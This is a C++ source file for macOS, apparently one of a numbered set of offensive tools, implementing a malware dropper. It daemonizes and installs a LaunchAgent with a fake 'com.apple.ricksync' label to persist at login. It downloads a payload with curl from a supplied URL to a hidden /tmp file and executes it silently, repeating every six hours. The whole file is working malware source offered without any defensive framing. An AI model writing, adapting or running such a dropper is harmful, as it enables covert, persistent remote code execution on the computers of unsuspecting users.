// language: C++17, file: src/macos/09_dropper_mac.cpp, target: macOS, clang
// Dropper macOS - curl download + exec cache + persistance LaunchAgent
// Usage: 09_dropper <url>  (defaut http://127.0.0.1:8080/p - sert un payload local pour test)
// Build: clang++ -O2 -std=c++17
#include <mach-o/dyld.h>
#include <fcntl.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <pwd.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#include <string>

static void Persist() {
    std::string dir = std::string(getpwuid(getuid())->pw_dir) + "/Library/LaunchAgents";
    mkdir(dir.c_str(), 0755);
    char self[MAXPATHLEN];
    uint32_t sz = sizeof(self);
    _NSGetExecutablePath(self, &sz);
    std::string plist = dir + "/com.apple.ricksync.plist";
    FILE* f = fopen(plist.c_str(), "w");
    if (!f) return;
    fprintf(f,
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        "<plist version=\"1.0\"><dict>\n"
        "  <key>Label</key><string>com.apple.ricksync</string>\n"
        "  <key>ProgramArguments</key><array><string>%s</string></array>\n"
        "  <key>RunAtLoad</key><true/>\n"
        "</dict></plist>\n", self);
    fclose(f);
}

static bool DropAndExec(const std::string& url) {
    const char* dst = "/tmp/.rick_payload";
    std::string cmd = "curl -s --max-time 30 -o " + std::string(dst) + " '" + url + "'";
    if (system(cmd.c_str()) != 0) return false;
    chmod(dst, 0700);
    // exec cache via fork + execv
    pid_t pid = fork();
    if (pid == 0) {
        int devnull = open("/dev/null", O_WRONLY);
        dup2(devnull, 0); dup2(devnull, 1); dup2(devnull, 2);
        execl(dst, dst, (char*)nullptr);
        _exit(1);
    }
    return pid > 0;
}

int main(int argc, char** argv) {
    daemon(0, 0);
    std::string url = argc > 1 ? argv[1] : "http://127.0.0.1:8080/p";
    Persist();
    // retente si le serveur etait down, re-pull toutes les 6 h
    for (;;) {
        DropAndExec(url);
        sleep(6 * 3600);
    }
}
